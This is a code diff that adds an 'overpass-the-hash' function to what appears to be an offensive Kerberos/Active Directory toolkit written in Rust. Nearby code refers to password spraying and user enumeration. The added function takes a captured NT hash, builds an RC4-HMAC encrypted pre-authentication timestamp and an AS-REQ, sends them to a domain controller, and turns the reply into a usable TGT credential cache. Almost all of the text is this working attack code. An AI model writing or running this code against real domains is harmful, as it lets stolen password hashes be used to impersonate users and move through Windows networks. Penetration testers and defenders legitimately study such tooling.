@@ -287,6 +287,54 @@ pub async fn asktgt(user: &str, realm: &str, kdc: &str, password: &str) -> Resul
     crate::pkinit::build_ccache(&as_rep, &enc_part, &realm, user)
 }
 
+/// Overpass-the-hash: obtain a TGT from just an NT hash via RC4-HMAC (etype 23) — the legacy
+/// (RC4-enabled, Server ≤2022) path. No salt discovery needed: the RC4 Kerberos key *is* the NT
+/// hash, so a captured/pass-the-hash NT hash becomes a full Kerberos TGT (ccache).
+pub async fn overpass_the_hash(
+    user: &str,
+    realm: &str,
+    kdc: &str,
+    nt: &[u8; 16],
+) -> Result<Vec<u8>> {
+    let realm = realm.to_uppercase();
+    let user = user.split('@').next().unwrap_or(user);
+    let user = user.rsplit('\\').next().unwrap_or(user);
+    let etype = ETYPE_RC4_HMAC;
+
+    // PA-ENC-TIMESTAMP encrypted under the NT hash (RC4-HMAC, key usage 1).
+    let ts = PaEncTsEnc {
+        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
+        pausec: Optional::from(None),
+    };
+    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
+    let enc_ts = crate::rc4::encrypt(nt, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der, None);
+    let padata = PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])), // PA-ENC-TIMESTAMP
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
+            picky_asn1_der::to_vec(&encrypted_data(etype, enc_ts))
+                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
+        )),
+    };
+    let raw = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype))
+        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
+    let resp = kdc_exchange(kdc, &raw).await?;
+    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
+        match picky_asn1_der::from_bytes::<KrbError>(&resp) {
+            Ok(err) => anyhow!(
+                "AS-REQ rejected, KDC error {} (RC4 disabled on this DC? — RC4 is off by default on Server 2025)",
+                err.0.error_code.0
+            ),
+            Err(_) => anyhow!("AS-REP decode: {e}"),
+        }
+    })?;
+    let enc = &as_rep.0.enc_part.0;
+    let plain = crate::rc4::decrypt(nt, AS_REP_ENC, &enc.cipher.0 .0)
+        .map_err(|e| anyhow!("decrypt AS-REP (RC4): {e}"))?;
+    let enc_part: EncAsRepPart =
+        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
+    crate::pkinit::build_ccache(&as_rep, &enc_part, &realm, user)
+}
+
 /// Outcome of a Kerberos pre-auth credential check (password spray / user enum).
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum CredResult {
